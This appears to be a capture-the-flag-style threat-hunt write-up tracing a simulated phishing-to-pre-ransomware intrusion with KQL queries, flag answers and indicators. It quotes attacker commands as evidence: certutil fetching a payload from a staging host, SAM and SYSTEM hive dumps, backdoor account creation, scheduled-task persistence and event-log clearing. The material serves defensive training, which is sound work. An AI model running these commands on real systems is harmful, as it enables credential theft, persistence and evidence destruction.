<img width="1750" height="989" alt="image" src="https://github.com/user-attachments/assets/3f67ac3e-fa96-4b4c-a121-eab5a4dbd847" />



# Threat Hunt: The Broker

## Executive Summary

This document summarizes a threat hunting investigation conducted against the **Sanc Logic** environment following a multi-stage intrusion. The investigation targeted devices `as-pc1`, `as-pc2`, and `as-srv` across a simulated attack chain spanning **January 15–27, 2026**.

A phishing payload (`daniel_richardson_cv.pdf.exe`) executed on `as-pc1` initiated a full attack lifecycle including credential theft, remote tool deployment, lateral movement, sensitive data access, memory-based credential theft, and shadow copy deletion — consistent with a pre-ransomware threat actor pattern.

---

## Environment Overview

| Asset | Role |
|-------|------|
| `as-pc1` | Initial infection point — employee workstation |
| `as-pc2` | Lateral movement target — secondary workstation |
| `as-srv` | File server — sensitive data repository |
| `sophie.turner` | Compromised user account (as-pc1) |
| `david.mitchell` | Compromised user account (as-pc2) |

---

## Attack Timeline

| Time (UTC) | Device | Event |
|------------|--------|-------|
| 2026-01-15 03:47 | as-pc1 | C2 beacon to `cdn.cloud-endpoint.net` |
| 2026-01-15 03:58 | as-pc1 | `daniel_richardson_cv.pdf.exe` executed by `sophie.turner` via Explorer |
| 2026-01-15 04:08 | as-pc1 | AnyDesk downloaded via certutil |
| 2026-01-15 04:13 | as-pc1 | SAM and SYSTEM hives saved to `C:\Users\Public\` |
| 2026-01-15 04:18 | as-pc1 | Failed lateral movement attempts via WMIC and PsExec |
| 2026-01-15 04:24 | as-pc1 | RDP pivot to as-pc2 via `mstsc.exe` |
| 2026-01-15 04:40 | as-pc2 | Administrator account enabled by `david.mitchell` |
| 2026-01-15 04:52 | as-pc2 | `RuntimeBroker.exe` downloaded from `sync.cloud-endpoint.net` |
| 2026-01-15 04:52 | as-pc2 | Scheduled task `MicrosoftEdgeUpdateCheck` created |
| 2026-01-15 04:44 | as-srv | `BACS_Payments_Dec2025.ods` accessed and modified |
| 2026-01-15 04:59 | as-srv | `Shares.7z` archive created |
| 2026-01-15 05:09 | as-pc1 | SharpChrome injected into `notepad.exe` |
| 2026-01-15 05:10 | as-pc1 | `notepad.exe ""` spawned as decoy/host process |
| 2026-01-27 09:09 | as-pc2 | Shadow copies deleted via `wmic shadowcopy delete` |

---

## Findings by Section

---

### Section 1: Initial Access

---

#### 🚩 Initial Vector
**Identify the file that started the infection chain.**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2026-01-01T00:00:00) .. datetime(2026-02-01T00:00:00))
| where DeviceName == "as-pc1"
| where InitiatingProcessFileName == "daniel_richardson_cv.pdf.exe"
```

**Answer:** `Daniel_Richardson_CV.pdf.exe`
**Timestamp:** `2026-01-15T03:58:55.656Z`

---

#### 🚩 Payload Hash
**Identify the SHA256 hash of the initial payload.**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2026-01-01T00:00:00) .. datetime(2026-02-01T00:00:00))
| where DeviceName == "as-pc1"
| where InitiatingProcessFileName == "daniel_richardson_cv.pdf.exe"
| project SHA256
```

**Answer:** `48b97fd91946e81e3e7742b3554585360551551cbf9398e1f34f4bc4eac3a6b5`

---

#### 🚩 User Interaction
**Determine how the payload was initially launched.**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2026-01-01T00:00:00) .. datetime(2026-02-01T00:00:00))
| where DeviceName == "as-pc1"
| where InitiatingProcessFileName == "daniel_richardson_cv.pdf.exe"
| project InitiatingProcessParentFileName
```

**Answer:** `explorer.exe`

> The payload was double-clicked by the user directly from Windows Explorer, indicating manual execution — consistent with a phishing lure.

---

#### 🚩 Suspicious Child Process
**The payload created a child process for further activity.**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2026-01-01T00:00:00) .. datetime(2026-02-01T00:00:00))
| where DeviceName == "as-pc1"
| where InitiatingProcessFileName == "daniel_richardson_cv.pdf.exe"
```

**Answer:** `notepad.exe`
**Timestamp:** `2026-01-15T05:09:53.399Z`

---

#### 🚩 Process Arguments
**The spawned process executed with unusual arguments.**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2026-01-01T00:00:00) .. datetime(2026-02-01T00:00:00))
| where DeviceName == "as-pc1"
| where InitiatingProcessFileName == "daniel_richardson_cv.pdf.exe"
```

**Answer:** `notepad.exe ""`
**Timestamp:** `2026-01-15T05:10:08.224Z`

> An empty quoted string argument is anomalous. The malware spawned Notepad as a decoy — making the victim think a document opened normally — while simultaneously using it as a host process for the SharpChrome credential theft tool injected reflectively into memory.

---

### Section 2: Command & Control

---

#### 🚩 C2 Domain
**The payload established outbound connections.**

```kql
DeviceNetworkEvents
| where TimeGenerated between (datetime(2026-01-01T00:00:00) .. datetime(2026-02-01T00:00:00))
| where DeviceName == "as-pc1"
| where InitiatingProcessFileName == "daniel_richardson_cv.pdf.exe"
```

**Answer:** `cdn.cloud-endpoint.net`
**Timestamp:** `2026-01-15T03:47:10.786Z`

---

#### 🚩 C2 Process
**Identify the process responsible for C2 traffic.**

**Answer:** `daniel_richardson_cv.pdf.exe`

---

#### 🚩 Staging Infrastructure
**Additional payloads were hosted externally.**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2026-01-01T00:00:00) .. datetime(2026-02-01T00:00:00))
| where ProcessCommandLine contains "Daniel"
```

**Answer:** `sync.cloud-endpoint.net`

**Full command observed:**
```
"certutil.exe" -urlcache -split -f https://sync.cloud-endpoint.net/Daniel_Richardson_CV.pdf.exe C:\Users\Public\RuntimeBroker.exe
```
**Device:** `as-pc2`
**Timestamp:** `2026-01-15T04:52:22.961Z`

---

### Section 3: Credential Access

---

#### 🚩 Registry Targets
**The attacker targeted local credential stores.**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2026-01-01T00:00:00) .. datetime(2026-02-01T00:00:00))
| where DeviceName == "as-pc1"
| where FileName =~ "reg.exe"
| project TimeGenerated, DeviceName, ProcessCommandLine, InitiatingProcessFileName
```

**Answer:** `SAM`, `SYSTEM`

**Commands observed:**
```
"reg.exe" save HKLM\SAM C:\Users\Public\sam.hiv
"reg.exe" save HKLM\SYSTEM C:\Users\Public\system.hiv
```

> Both hives were exported within 1 second of each other, confirming automated/scripted execution. SAM contains local password hashes; SYSTEM contains the boot key required to decrypt them.

---

#### 🚩 Local Staging
**Extracted data was saved locally before exfiltration.**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2026-01-01T00:00:00) .. datetime(2026-02-01T00:00:00))
| where DeviceName == "as-pc1"
| where FileName =~ "reg.exe"
| project TimeGenerated, DeviceName, ProcessCommandLine, InitiatingProcessFileName
```

**Answer:** `C:\Users\Public\`

---

#### 🚩 Execution Identity
**Credential extraction was performed under a specific user context.**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2026-01-01T00:00:00) .. datetime(2026-02-01T00:00:00))
| where DeviceName == "as-pc1"
| where FileName =~ "reg.exe"
| project TimeGenerated, AccountName, DeviceName, ProcessCommandLine, InitiatingProcessFileName
```

**Answer:** `sophie.turner`

---

### Section 4: Discovery

---

#### 🚩 User Context
**The attacker confirmed their identity after initial access.**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2026-01-01T00:00:00) .. datetime(2026-02-01T00:00:00))
| where DeviceName == "as-pc1"
| where InitiatingProcessFileName == "daniel_richardson_cv.pdf.exe"
| project TimeGenerated, AccountName, DeviceName, ProcessCommandLine, InitiatingProcessFileName
```

**Answer:** `whoami.exe`

---

#### 🚩 Network Enumeration
**The attacker enumerated network resources.**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2026-01-01T00:00:00) .. datetime(2026-02-01T00:00:00))
| where DeviceName == "as-pc1"
| where InitiatingProcessFileName == "daniel_richardson_cv.pdf.exe"
| project TimeGenerated, AccountName, DeviceName, ProcessCommandLine, InitiatingProcessFileName
```

**Answer:** `net.exe view`

---

#### 🚩 Local Admins
**The attacker enumerated privileged local group membership.**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2026-01-01T00:00:00) .. datetime(2026-02-01T00:00:00))
| where DeviceName == "as-pc1"
| where InitiatingProcessFileName == "daniel_richardson_cv.pdf.exe"
| project TimeGenerated, AccountName, DeviceName, ProcessCommandLine, InitiatingProcessFileName
```

**Answer:** `administrators`

---

### Section 5: Persistence — Remote Tool

---

#### 🚩 Remote Tool
**A legitimate remote administration tool was deployed for ongoing access.**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2026-01-01T00:00:00) .. datetime(2026-02-01T00:00:00))
| where DeviceName == "as-pc1"
| where InitiatingProcessFileName == "daniel_richardson_cv.pdf.exe"
| project TimeGenerated, AccountName, DeviceName, ProcessCommandLine, InitiatingProcessFileName
```

**Answer:** `AnyDesk`

---

#### 🚩 Remote Tool Hash
**Identify the SHA256 hash of the remote access tool.**

```kql
DeviceFileEvents
| where TimeGenerated between (datetime(2026-01-01T00:00:00) .. datetime(2026-02-01T00:00:00))
| where DeviceName == "as-pc1"
| where FileName contains "anydesk"
```

**Answer:** `f42b635d93720d1624c74121b83794d706d4d064bee027650698025703d20532`

---

#### 🚩 Download Method
**The tool was downloaded using a native Windows binary.**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2026-01-01T00:00:00) .. datetime(2026-02-01T00:00:00))
| where DeviceName == "as-pc1"
| where InitiatingProcessFileName == "daniel_richardson_cv.pdf.exe"
| project TimeGenerated, AccountName, FileName, DeviceName, ProcessCommandLine, InitiatingProcessFileName, SHA256
```

**Answer:** `certutil`

**Full command:**
```
certutil -urlcache -split -f https://download.anydesk.com/AnyDesk.exe C:\Users\Public\AnyDesk.exe
```

---

#### 🚩 Configuration Access
**After installation, a configuration file was accessed.**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2026-01-01T00:00:00) .. datetime(2026-02-01T00:00:00))
| where DeviceName == "as-pc1"
| where InitiatingProcessFileName == "daniel_richardson_cv.pdf.exe"
| project TimeGenerated, AccountName, FileName, DeviceName, ProcessCommandLine, InitiatingProcessFileName, SHA256
```

**Answer:** `C:\Users\Sophie.Turner\AppData\Roaming\AnyDesk\system.conf`

---

#### 🚩 Access Credentials
**Unattended access was configured for the remote tool.**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2026-01-01T00:00:00) .. datetime(2026-02-01T00:00:00))
| where DeviceName == "as-pc1"
| where InitiatingProcessFileName == "daniel_richardson_cv.pdf.exe"
| project TimeGenerated, AccountName, FileName, DeviceName, ProcessCommandLine, InitiatingProcessFileName, SHA256
```

**Answer:** `intrud3r!`

**Command observed:**
```
cmd.exe /c "echo intrud3r! | C:\Users\Public\AnyDesk.exe --set-password"
```

---

#### 🚩 Deployment Footprint
**The remote tool was installed across the environment.**

```kql
DeviceFileEvents
| where TimeGenerated between (datetime(2026-01-01T00:00:00) .. datetime(2026-02-01T00:00:00))
| where FolderPath contains "AnyDesk"
| project TimeGenerated, FileName, DeviceName, InitiatingProcessFileName, SHA256
```

**Answer:** `as-pc1`, `as-pc2`, `as-srv`

---

### Section 6: Lateral Movement

---

#### 🚩 Failed Execution
**The attacker attempted remote execution methods that failed.**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2026-01-01T00:00:00) .. datetime(2026-02-01T00:00:00))
| where DeviceName has_any ("as-pc1", "as-pc2", "as-srv")
| where FileName in~ ("psexec.exe", "wmic.exe", "psexec64.exe", "paexec.exe")
| project TimeGenerated, AccountName, DeviceName, FileName, ProcessCommandLine
```

**Answer:** `WMIC.exe`, `PsExec.exe`
**Timestamp:** `2026-01-15T04:18:44.612Z`

> Confirmed failed — no child processes spawned on `as-pc2` from either tool. Verified by querying `DeviceProcessEvents` on `as-pc2` with `InitiatingProcessFileName =~ "psexec.exe"` which returned no results.

---

#### 🚩 Target Host
**What hostname was targeted in the failed attempts?**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2026-01-01T00:00:00) .. datetime(2026-02-01T00:00:00))
| where DeviceName has_any ("as-pc1", "as-pc2", "as-srv")
| where FileName in~ ("psexec.exe", "wmic.exe", "psexec64.exe", "paexec.exe")
| project TimeGenerated, AccountName, DeviceName, FileName, ProcessCommandLine
```

**Answer:** `as-pc2`

---

#### 🚩 Successful Pivot
**After failed attempts, a different method achieved lateral movement.**

```kql
DeviceNetworkEvents
| where TimeGenerated between (datetime(2026-01-01T00:00:00) .. datetime(2026-02-01T00:00:00))
| where DeviceName == "as-pc2"
| where RemotePort == 3389
```

**Answer:** `mstsc.exe` (Windows RDP)

---

#### 🚩 Movement Path
**The attacker moved through the environment in a specific sequence.**

**Answer:** `as-pc1 > as-pc2 > as-srv`

| Hop | Device | Method | Notes |
|-----|--------|--------|-------|
| 1 | `as-pc1` | Phishing execution | `daniel_richardson_cv.pdf.exe` run by `sophie.turner` |
| 2 | `as-pc2` | RDP (`mstsc.exe`) | After failed WMIC/PsExec attempts |
| 3 | `as-srv` | AnyDesk | Confirmed by AnyDesk deployment footprint on all 3 hosts |

---

#### 🚩 Compromised Account
**A valid account was used for successful lateral movement.**

**Answer:** `david.mitchell`

---

#### 🚩 Account Activation
**A disabled account was enabled for further access.**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2026-01-01T00:00:00) .. datetime(2026-02-01T00:00:00))
| where DeviceName has_any ("as-pc1", "as-pc2", "as-srv")
| where ProcessCommandLine has_any ("active:yes")
| project TimeGenerated, DeviceName, FileName, ProcessCommandLine, AccountName
| sort by TimeGenerated asc
```

**Answer:** `/active:yes`

**Full command:**
```
"net.exe" user Administrator /active:yes
```
**Device:** `as-pc2` | **Timestamp:** `2026-01-15T04:40:31.948Z`

---

#### 🚩 Activation Context
**The account activation was performed by a specific user.**

**Answer:** `david.mitchell`

---

### Section 7: Persistence — Scheduled Task

---

#### 🚩 Scheduled Persistence
**A scheduled task was created for persistence.**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2026-01-01T00:00:00) .. datetime(2026-02-01T00:00:00))
| where DeviceName == "as-pc2"
| where ProcessCommandLine contains "runtime"
| project TimeGenerated, DeviceName, FileName, ProcessCommandLine
| sort by TimeGenerated asc
```

**Answer:** `MicrosoftEdgeUpdateCheck`
**Timestamp:** `2026-01-15T04:52:32.687Z`

**Full command:**
```
"schtasks.exe" /create /tn MicrosoftEdgeUpdateCheck /tr C:\Users\Public\RuntimeBroker.exe /sc daily /st 03:00 /rl highest /f
```

> Task runs daily at 3:00 AM with highest privileges — designed to blend in as a legitimate Edge update check.

---

#### 🚩 Renamed Binary
**The persistence payload was renamed to avoid detection.**

**Answer:** `RuntimeBroker.exe`
**Timestamp:** `2026-01-15T04:52:22.961Z`

**Full command:**
```
"certutil.exe" -urlcache -split -f https://sync.cloud-endpoint.net/Daniel_Richardson_CV.pdf.exe C:\Users\Public\RuntimeBroker.exe
```

> `RuntimeBroker.exe` is a legitimate Windows process name, used here to disguise the malicious payload.

---

#### 🚩 Persistence Hash
**The persistence payload shares a hash with another file in the investigation.**

```kql
// Find the renamed file with hash
DeviceFileEvents
| where TimeGenerated between (datetime(2026-01-01T00:00:00) .. datetime(2026-02-01T00:00:00))
| where DeviceName == "as-pc2"
| where FileName =~ "RuntimeBroker.exe"
| project TimeGenerated, FileName, SHA256, FolderPath

// Find all files matching hash
| where SHA256 == "48b97fd91946e81e3e7742b3554585360551551cbf9398e1f34f4bc4eac3a6b5"
```

**Answer:** `48b97fd91946e81e3e7742b3554585360551551cbf9398e1f34f4bc4eac3a6b5`

> Hash matches `daniel_richardson_cv.pdf.exe` — confirming `RuntimeBroker.exe` is the same payload renamed and redeployed on `as-pc2`.

---

#### 🚩 Backdoor Account
**A new local account was created for future access.**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2026-01-01T00:00:00) .. datetime(2026-02-01T00:00:00))
| where DeviceName has_any ("as-pc1", "as-pc2", "as-srv")
| where ProcessCommandLine contains "user"
| where FileName contains "net.exe"
| project TimeGenerated, DeviceName, FileName, ProcessCommandLine
| sort by TimeGenerated asc
```

**Answer:** `svc_backup`

**Commands observed:**
```
net.exe user svc_backup ********** /add
net.exe localgroup Administrators svc_backup /add
```

> Account named to resemble a legitimate backup service account. Added to the local Administrators group immediately after creation — MITRE ATT&CK T1136.001.

---

### Section 8: Data Access

---

#### 🚩 Sensitive Document
**A sensitive document was accessed on the file server.**

```kql
DeviceFileEvents
| where TimeGenerated between (datetime(2026-01-01T00:00:00) .. datetime(2026-02-01T00:00:00))
| where DeviceName == "as-srv"
| where FolderPath contains "Shares"
| project TimeGenerated, ActionType, FileName, FolderPath, InitiatingProcessFileName
| sort by TimeGenerated asc
```

**Answer:** `BACS_Payments_Dec2025.ods`
**Location:** `C:\Shares\Payroll\`
**Timestamp:** `2026-01-15T04:44:06.014Z`

> BACS (Bankers' Automated Clearing Services) payment file containing UK bank transfer data. Accessed remotely from `as-pc2` over SMB.

---

#### 🚩 Modification Evidence
**The document was opened for editing, not just viewing.**

```kql
DeviceFileEvents
| where TimeGenerated between (datetime(2026-01-01T00:00:00) .. datetime(2026-02-01T00:00:00))
| where DeviceName == "as-srv"
| where FolderPath contains "Shares"
| project TimeGenerated, ActionType, FileName, FolderPath, InitiatingProcessFileName
| sort by TimeGenerated asc
```

**Answer:** `.~lock.BACS_Payments_Dec2025.ods#`
**Timestamp:** `2026-01-15T04:44:06.014Z`

> LibreOffice creates a `.~lock.<filename>#` file when a document is actively open for editing. Multiple lock file creations and `.TMP` rename operations confirm the file was opened, read, and saved multiple times between 04:44–04:47 UTC.

---

#### 🚩 Access Origin
**The document was accessed from a specific workstation.**

```kql
DeviceFileEvents
| where TimeGenerated between (datetime(2026-01-01T00:00:00) .. datetime(2026-02-01T00:00:00))
| where DeviceName == "as-srv"
| where FolderPath contains "Shares"
| project TimeGenerated, ActionType, FileName, FolderPath, InitiatingProcessFileName, InitiatingProcessRemoteSessionDeviceName
| sort by TimeGenerated asc
```

**Answer:** `as-pc2`

---

#### 🚩 Exfil Archive
**Data was archived before potential exfiltration.**

```kql
DeviceFileEvents
| where TimeGenerated between (datetime(2026-01-01T00:00:00) .. datetime(2026-02-01T00:00:00))
| where DeviceName == "as-srv"
| where FolderPath contains "Shares"
| project TimeGenerated, ActionType, FileName, FolderPath, InitiatingProcessFileName, InitiatingProcessRemoteSessionDeviceName
| sort by TimeGenerated asc
```

**Answer:** `Shares.7z`
**Timestamp:** `2026-01-15T04:59:04.912Z`

> Created by `7zg.exe` at `C:\Shares.7z`, subsequently moved to `C:\Shares\Clients\Shares.7z` by `explorer.exe`.

---

#### 🚩 Archive Hash
**Identify the SHA256 hash of the staged archive.**

```kql
DeviceFileEvents
| where TimeGenerated between (datetime(2026-01-01T00:00:00) .. datetime(2026-02-01T00:00:00))
| where DeviceName == "as-srv"
| where FolderPath contains "Shares"
| project TimeGenerated, ActionType, FileName, SHA256, FolderPath, InitiatingProcessFileName, InitiatingProcessRemoteSessionDeviceName
| sort by TimeGenerated asc
```

**Answer:** `6886c0a2e59792e69df94d2cf6ae62c2364fda50a23ab44317548895020ab048`

---

#### 🚩 Log Clearing
**The attacker cleared logs to cover their tracks.**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2026-01-01T00:00:00) .. datetime(2026-02-01T00:00:00))
| where DeviceName == "as-srv"
| where ProcessCommandLine has_any ("Clear-EventLog", "wevtutil", "cl")
| project TimeGenerated, FileName, ProcessCommandLine
| sort by TimeGenerated asc
```

**Answer:** `Security`, `System`

**Logs cleared across devices:**
```
wevtutil cl Security
wevtutil cl System
wevtutil cl Application
wevtutil cl "Windows PowerShell"
wevtutil cl Setup
"wevtutil" cl "Microsoft-Windows-PowerShell/Operational"
```

> Log clearing observed on multiple devices. Local Windows Event Logs were deleted; telemetry was preserved in Log Analytics Workspace as MDE streams data to the cloud in near real-time prior to deletion.

---

#### 🚩 Reflective Loading
**Evidence of reflective code loading was captured.**

```kql
DeviceEvents
| where TimeGenerated between (datetime(2026-01-01T00:00:00) .. datetime(2026-02-01T00:00:00))
| where DeviceName == "as-srv"
| where ActionType contains "ClrUnbackedModuleLoaded"
```

**Answer:** `ClrUnbackedModuleLoaded`
**Timestamp:** `2026-01-15T03:54:13.344Z`

> A .NET assembly was loaded into memory with no backing file on disk — classic reflective loading. No file artifact exists to scan, making this technique effective at evading traditional AV detection.

---

#### 🚩 Memory Tool
**A credential theft tool was loaded directly into memory.**

```kql
DeviceEvents
| where TimeGenerated between (datetime(2026-01-01T00:00:00) .. datetime(2026-02-01T00:00:00))
| where DeviceName has_any ("as-pc1", "as-pc2", "as-srv")
| where ActionType == "ClrUnbackedModuleLoaded"
| project TimeGenerated, DeviceName, AccountName, InitiatingProcessFileName, AdditionalFields
```

**Answer:** `SharpChrome`
**Timestamp:** `2026-01-15T05:09:53.571Z`

**AdditionalFields:**
```json
{
  "ModuleILPathOrName": "SharpChrome",
  "ModuleFlags": 8,
  "ClrInstanceId": 22
}
```

> SharpChrome is a .NET tool from the GhostPack toolkit designed to extract saved passwords, cookies, and login data from Google Chrome by decrypting DPAPI-protected credential stores. Loaded entirely in memory — no file on disk.

---

#### 🚩 Host Process
**The credential theft tool was injected into a legitimate process.**

```kql
DeviceEvents
| where TimeGenerated between (datetime(2026-01-01T00:00:00) .. datetime(2026-02-01T00:00:00))
| where DeviceName has_any ("as-pc1", "as-pc2", "as-srv")
| where ActionType == "ClrUnbackedModuleLoaded"
| project TimeGenerated, DeviceName, AccountName, InitiatingProcessFileName, AdditionalFields
```

**Answer:** `notepad.exe`

> The same `notepad.exe ""` spawned as a decoy (Process Arguments flag) was also the host process for SharpChrome. The malware used Notepad as a legitimate-looking container for the in-memory injection — a dual-purpose technique combining social engineering (decoy) with evasion (trusted host process).

---

## Indicators of Compromise (IOCs)

### Malicious Files

| Filename | SHA256 | Description |
|----------|--------|-------------|
| `Daniel_Richardson_CV.pdf.exe` | `48b97fd91946e81e3e7742b3554585360551551cbf9398e1f34f4bc4eac3a6b5` | Initial phishing payload |
| `RuntimeBroker.exe` | `48b97fd91946e81e3e7742b3554585360551551cbf9398e1f34f4bc4eac3a6b5` | Renamed payload on as-pc2 (same hash) |
| `AnyDesk.exe` | `f42b635d93720d1624c74121b83794d706d4d064bee027650698025703d20532` | Remote access tool |
| `Shares.7z` | `6886c0a2e59792e69df94d2cf6ae62c2364fda50a23ab44317548895020ab048` | Exfiltration archive |
| `sam.hiv` | — | Exported SAM registry hive |
| `system.hiv` | — | Exported SYSTEM registry hive |

### Network Indicators

| Indicator | Type | Description |
|-----------|------|-------------|
| `cdn.cloud-endpoint.net` | C2 Domain | Command and control beacon |
| `sync.cloud-endpoint.net` | Staging Domain | Payload hosting |
| `download.anydesk.com` | Download Domain | AnyDesk delivery (legitimate, abused) |

### Accounts

| Username | Device | Action |
|----------|--------|--------|
| `sophie.turner` | as-pc1 | Compromised — executed phishing payload |
| `david.mitchell` | as-pc2 | Compromised — lateral movement account |
| `svc_backup` | as-pc1/as-pc2 | Created backdoor admin account |
| `Administrator` | as-pc2 | Re-enabled by attacker |

### Persistence Mechanisms

| Type | Name / Location | Device |
|------|-----------------|--------|
| Scheduled Task | `MicrosoftEdgeUpdateCheck` → `C:\Users\Public\RuntimeBroker.exe` | as-pc2 |
| Remote Access Tool | AnyDesk with password `intrud3r!` | as-pc1, as-pc2, as-srv |
| Backdoor Account | `svc_backup` (local admin) | as-pc1 |

---

## MITRE ATT&CK Mapping

| Technique ID | Name | Evidence |
|-------------|------|----------|
| T1566.001 | Phishing: Spearphishing Attachment | `daniel_richardson_cv.pdf.exe` |
| T1204.002 | User Execution: Malicious File | Executed via `explorer.exe` |
| T1071.001 | Application Layer Protocol: Web | C2 via `cdn.cloud-endpoint.net` |
| T1105 | Ingress Tool Transfer | certutil downloading payloads |
| T1140 | Deobfuscate/Decode Files | certutil `-urlcache -split -f` |
| T1003.002 | OS Credential Dumping: SAM | `reg save HKLM\SAM` |
| T1057 | Process Discovery | `tasklist \| findstr lsass` |
| T1087.001 | Account Discovery: Local Account | `net.exe localgroup administrators` |
| T1135 | Network Share Discovery | `net.exe view` |
| T1021.001 | Remote Services: RDP | `mstsc.exe` pivot to as-pc2 |
| T1047 | Windows Management Instrumentation | WMIC lateral movement attempt |
| T1569.002 | System Services: Service Execution | PsExec lateral movement attempt |
| T1136.001 | Create Account: Local Account | `svc_backup` account creation |
| T1053.005 | Scheduled Task/Job | `MicrosoftEdgeUpdateCheck` task |
| T1036.005 | Masquerading: Match Legitimate Name | `RuntimeBroker.exe` rename |
| T1219 | Remote Access Software | AnyDesk deployment |
| T1555.003 | Credentials from Web Browsers | SharpChrome injected into notepad.exe |
| T1620 | Reflective Code Loading | `ClrUnbackedModuleLoaded` — SharpChrome |
| T1005 | Data from Local System | BACS_Payments_Dec2025.ods accessed |
| T1560.001 | Archive Collected Data | `Shares.7z` created via 7zg.exe |
| T1070.001 | Indicator Removal: Clear Windows Event Logs | wevtutil clearing across all devices |
| T1490 | Inhibit System Recovery | `wmic shadowcopy delete` on as-pc2 |

---

## Document Information

| Field | Value |
|-------|-------|
| Hunt Name | The Broker |
| Environment | Sanc Logic |
| Devices Investigated | as-pc1, as-pc2, as-srv |
| Investigation Period | 2026-01-15 — 2026-01-27 |
| Flags Completed | 29 |
| Status | Complete |
